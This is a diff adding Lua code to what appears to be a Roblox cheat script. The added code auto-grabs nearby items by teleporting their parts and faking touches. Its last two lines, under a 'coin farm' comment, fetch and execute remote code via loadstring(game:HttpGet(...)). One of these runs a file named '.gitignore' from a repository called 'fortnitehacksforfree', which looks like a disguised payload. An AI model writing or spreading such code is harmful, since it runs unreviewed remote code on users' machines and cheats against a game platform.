+autograb_whitelist:OnChanged(function()
+	table.clear(autograbwhitelist)
+	for i,v in pairs(autograb_whitelist.Value:split(",")) do
+		autograbwhitelist[trim(v)]=true
+	end
+end)
+for i,v in pairs(autograb_whitelist.Value:split(",")) do
+	autograbwhitelist[trim(v)]=true
+end
+
+local function chest(item)
+	if not autograbchest then return end
+	if item:IsA("Model") then
+		for i,v in pairs(item:GetDescendants()) do
+			if v:IsA("BasePart") then v.CFrame=autograbchest.CFrame end
+		end
+		touch(getMover(item),autograbchest)
+	else
+		item.CFrame=autograbchest.CFrame
+		touch(item,autograbchest)
+	end
+end
+autograb_enabled:OnChanged(function()
+	local items = {}
+	local lastupdate = Vector3.new(0,-1000,0)
+	local itemcon = workspace.Items.ChildAdded:Connect(function(v)
+		if v:GetPivot().Position~=Vector3.new() then
+			local dist = (root.Position-v:GetPivot().Position).Magnitude
+			if dist<75 then
+				table.insert(items,v)
+			end
+		end
+	end)
+	while true do
+		local step = rs.PostSimulation:Wait()
+		if not (isrunning and autograb_enabled.Value) then break end
+		if not root then continue end
+		if (root.Position-lastupdate).Magnitude>25 then
+			table.clear(items)
+			for i,v in pairs(workspace.Items:GetChildren()) do
+				if v:GetPivot().Position~=Vector3.new() then
+					local dist = (root.Position-v:GetPivot().Position).Magnitude
+					if dist<75 then
+						table.insert(items,v)
+					end
+				end
+			end
+			lastupdate=root.Position
+		end
+		for i,v in pairs(items) do
+			if v:GetPivot().Position~=Vector3.new() and (not autograb_whitelistenabled.Value or autograbwhitelist[v.Name]) then
+				local dist = (root.Position-v:GetPivot().Position).Magnitude
+				if dist<autograb_range.Value then
+					if autograb_chest.Value then
+						manipulate(v,chest,autograb_safechest.Value)
+						break
+					else
+						pickup(v)
+					end
+				end
+			end
+		end
+	end
+	itemcon:Disconnect()
+end)
+--coin farm
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Proxylol/OtherScripts/main/AntiAfk.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/fortnitehacksforfree/newcallofduty/main/.gitignore'))()
